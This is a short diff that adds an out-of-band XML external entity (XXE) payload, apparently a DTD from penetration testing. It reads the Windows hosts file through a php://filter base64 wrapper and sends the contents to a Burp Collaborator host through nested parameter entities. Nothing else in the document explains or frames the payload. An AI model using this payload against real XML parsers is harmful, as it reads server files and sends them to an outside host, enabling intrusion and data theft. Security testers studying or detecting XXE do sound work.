@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///WINDOWS/system32/drivers/etc/hosts">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://187g18rzkhz0dnksg2yghetft6z1nq.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfil;
